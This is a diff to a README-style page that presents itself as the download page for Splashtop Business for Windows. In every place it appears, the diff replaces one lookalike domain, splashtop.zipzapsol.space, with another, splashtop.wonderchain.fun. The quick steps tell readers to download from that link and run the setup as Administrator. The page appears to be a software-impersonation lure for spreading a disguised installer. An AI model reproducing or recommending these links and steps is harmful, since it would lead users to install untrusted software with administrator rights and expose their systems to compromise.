@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Splashtop Business** for Windows.
 
 <p align="center">
-  <a href="https://splashtop.zipzapsol.space/">
+  <a href="https://splashtop.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Splashtop%20Business-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Splashtop Business">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[splashtop.zipzapsol.space](https://splashtop.zipzapsol.space/)** |
-| **Full URL** | `https://splashtop.zipzapsol.space/` |
+| **Direct link** | **[splashtop.wonderchain.fun](https://splashtop.wonderchain.fun/)** |
+| **Full URL** | `https://splashtop.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — splashtop.zipzapsol.space](https://splashtop.zipzapsol.space/)** (link above)
+1. Click **[Download — splashtop.wonderchain.fun](https://splashtop.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://splashtop.zipzapsol.space/"><strong>⬇ Download Splashtop Business now</strong></a></p>
+<p align="center"><a href="https://splashtop.wonderchain.fun/"><strong>⬇ Download Splashtop Business now</strong></a></p>
 
 ---
 
